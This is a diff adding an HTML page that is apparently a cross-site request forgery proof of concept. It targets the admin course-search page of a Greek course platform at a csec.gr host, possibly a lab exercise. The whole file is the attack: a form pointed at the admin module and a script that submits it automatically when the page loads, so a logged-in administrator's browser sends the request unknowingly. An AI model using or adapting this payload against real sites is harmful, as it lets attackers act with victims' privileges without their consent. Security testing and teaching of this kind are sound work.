@@ -1,0 +1,26 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/listcours.php?search=yes' method='post'>
+
+ <th width='220'>&nbsp;</th><td><b>Κριτήρια Αναζήτησης (<a href="searchcours.php?new=yes">Νέα Αναζήτηση</a>)</b></td></tr><tr><th class='left'>Τίτλος:</th>
+ <td><input type="text" class='FormData_InputText' name="formsearchtitle" size="40" value=""></td>
+ </tr><tr><th class='left'><b>Μάθημα (Κωδικός):</b></th>
+ <td><input class='FormData_InputText' type="text" name="formsearchcode" size="40" value=""></td>
+ </tr><tr><th class='left'><b>Τύπος πρόσβασης:</b></td>
+ <td>
+ <select name="formsearchtype" class="auth_input">
+ <option value="-1" selected>(όλοι οι τύποι πρόσβασης)</option>
+ <option value="2" >Ανοικτό</option>
+ <option value="1" >Ανοικτό με εγγραφή</option>
+ <option value="0" >Κλειστό</option>
+ </select>
+ </td></tr><tr><th class='left'><b>Σχολή / Τμήμα:</b></th>
+ <td><select name="formsearchfaculte" class="auth_input">
+ <option value="0">Σε όλες τις σχολές / τμήματα</option>
+ <option>Τμήμα 1</option><option>Τμήμα 2</option><option>Τμήμα 4</option></select></td></tr><tr><th>&nbsp;</th><td>
+ 	<input type='submit' name='search_submit' value='Αναζήτηση'></td></tr></tbody></table>
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
